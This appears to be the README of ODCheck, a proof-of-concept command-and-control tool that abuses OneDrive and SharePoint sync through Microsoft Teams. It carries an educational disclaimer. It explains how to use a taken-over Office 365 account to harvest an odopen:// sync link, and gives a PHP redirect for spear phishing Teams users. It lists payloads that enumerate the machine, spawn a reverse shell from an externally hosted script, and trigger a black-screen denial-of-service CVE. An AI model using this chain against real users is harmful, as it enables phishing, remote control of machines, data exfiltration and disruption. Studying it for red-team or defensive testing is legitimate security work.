# DISCLAIMER:
This tool is to be used for educational purposes only. I do not take responsibility if you use this in any other way. 

It's a proof of concept solution that was created for https://collectingflags.com/research/file-extension-spoofing-in-microsoft-sharepoint-onedrive-and-teams/ If you use this for malicious reasons, you will most likely get caught. Don't do it.

# ODCheck

ODCheck is a C2-like proof-of-concept solution designed to evaluate systems against data exfiltration through OneDrive sync traffic. The ODOpen URL can be used for spear phishing in the Microsoft Teams desktop client to establish sync connections with a target through the auto sync functionality. If the connection is successful to an attacker controlled library and the user executes ODCheck, then the client can be used to run commands on the machine based on the file names that are detected in the sync folder. The prebuilt tools and scripts available can help test for the following MITRE techniques:

| MITRE Technique             | ID |
| :---------------- | :------: |
| Exfiltration over C2 Channel        |   [T1041](https://attack.mitre.org/techniques/T1041/)   |
| Masquerading: Right-to-Left Override            |   [T1036.002](https://attack.mitre.org/techniques/T1036/002/)   |
| Modify Registry    |  [T1112](https://attack.mitre.org/techniques/T1112/)   |
| Automated Collection |  [T1119](https://attack.mitre.org/techniques/T1119/)   |
| Denial of Service | [T0814](https://attack.mitre.org/techniques/T0814/)  |
|Command and Scripting Interpreter: PowerShell| [T1059.001](https://attack.mitre.org/techniques/T0814/) |
|Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) |
|Web Service: Bidirectional Communication| [T1102.002](https://attack.mitre.org/techniques/T1102/002/)
<br/>

 **Setting Up ODCheck**
 
```
# You will need to have the PS2EXE PowerShell module installed 
Install-Module PS2EXE

# Copy the full ODCheck Folder from Github
git clone https://github.com/itssixtyn3in/ODCheck

# Run Manager.ps1 to start the Wizard
.\manager.ps1
```
ODCheck provides a few customization options from here that can be used, depending on what all you want to test.

- When configuring ODCheck, the file names that it watches for will be randomized and copied to the 'Payload folder'. These are the files that you will want to drop into the Sharepoint folder once ODCheck has been activated. The setup will also require that you know the tenant and document library name that you will be using for the mutual sync connection. This information will be required to setup the sync connection to the correct local folder.

- I recommend that you host your reverse shell and other scripts externally. The wizard will ask you for the URL that they're hosted on. 

- If you want to package the file into an EXE with a custom icon, then just specify the file path for the .ico file.

![odcheck_usage](https://github.com/itssixtyn3in/ODCheck/assets/130003354/0824c20a-0c39-47d9-889a-2ebab659e127)

 <br/>

 **Establishing A Sync Connection**
 
 The Microsoft Teams client in it's default configuration allows users to add website tabs to private conversations, or Teams channels. The website tab option can be linked to external pages, which can be used as a jumping point to have users sync specific Sharepoint libraries using the ODOpen:// protocol handler. For further details regarding this please see https://collectingflags.com/research/file-extension-spoofing-in-microsoft-sharepoint-onedrive-and-teams/

 If you've taken over a Office 365 account and can create Sharepoint Sites and write Microsoft Teams messages, then you can retrieve the ODSync link the following way. 
- Create a new sharepoint library and upload a file
- In a browser open up your dev tools > network > click on the 'sync' button on the Sharepoint page to trigger the ODOpen command
- Copy the URL from the network section entry
  
 ![onedrive_link-1024x231](https://github.com/itssixtyn3in/ODCheck/assets/130003354/40d0c5a7-c598-4a7f-adfb-349c533b7724)

 Your link for the sync connection will look similar to this:
 ```
 odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin=1&siteId=%7B123456e2%2D77be%2D4e43%2D9301%2D2d6cc8d5f778%7D&webId=%7B88af89a5%2D547e%2D44e5%2Dbab9%2Dcf1b27958693%7D&webTitle=OneDriveHealthCheck&webTemplate=64&webLogoUrl=%2Fsites%2FOneDriveHealthCheck2%2F%5Fapi%2FGroupService%2FGetGroupImage%3Fid%3D%27bdbb85bc%2D127a%2D4d63%2D95a6%2Dadaaf1394c1b%27%26hash%3D638490900916829775&webUrl=https%3A%2F%2Fexample%2Esharepoint%2Ecom%2Fsites%2FOneDriveHealthCheck2&onPrem=0&libraryType=3&listId=95e13011%2D92c1%2D488b%2Db46f%2D6d7b7b31fe0b&listTitle=Documents&scope=OPENLIST
```
Upload the ODOpen URL in a PHP file on a webhost that you control. The PHP file content should look like the following:
```
<?php
header("Location: odopen://sync?userId=&userEmail=user%40email%2Ecom&isSiteAdmin=1&siteId=%7B123456e2%2D77be%2D4e43%2D9301%2D2d6cc8d5f778%7D&webId=%7B88af89a5%2D547e%2D44e5%2Dbab9%2Dcf1b27958693%7D&webTitle=OneDriveHealthCheck&webTemplate=64&webLogoUrl=%2Fsites%2FOneDriveHealthCheck2%2F%5Fapi%2FGroupService%2FGetGroupImage%3Fid%3D%27bdbb85bc%2D127a%2D4d63%2D95a6%2Dadaaf1394c1b%27%26hash%3D638490900916829775&webUrl=https%3A%2F%2Fexample%2Esharepoint%2Ecom%2Fsites%2FOneDriveHealthCheck2&onPrem=0&libraryType=3&listId=95e13011%2D92c1%2D488b%2Db46f%2D6d7b7b31fe0b&listTitle=Documents&scope=OPENLIST", true, 301);
exit;
?>
```
 Once this sync has been established, then ODCheck can assist with creating a C2 connection. 
<br/><br/>
**Running commands**

Once a sync connection has been set up to the Sharepoint Document Library and the ODCheck client has been executed, then commands can be executed by dropping the payload files into the shared sync folder. 

- Enumeration: Runs multiple Windows enumeration commands and returns the output into the sync folder.
- Reverse Shell: Attempts to run an external script that spawns a reverse shell.
- DOS Condition: Attempts to trigger CVE-2023-32214 which causes a blackscreen for the user if ms-cxh-full:// is available. The screen will reappear if the machine is restarted.
- External Scripts: Attempts to run an external PowerShell script for customization purposes.
- Tool Move: Attempts to move the specified file from the OneDrive folder into Downloads (or another specified folder if manually changed in the script)

https://github.com/itssixtyn3in/ODCheck/assets/130003354/36ea337f-ed2c-427e-9d4e-9628c812404f

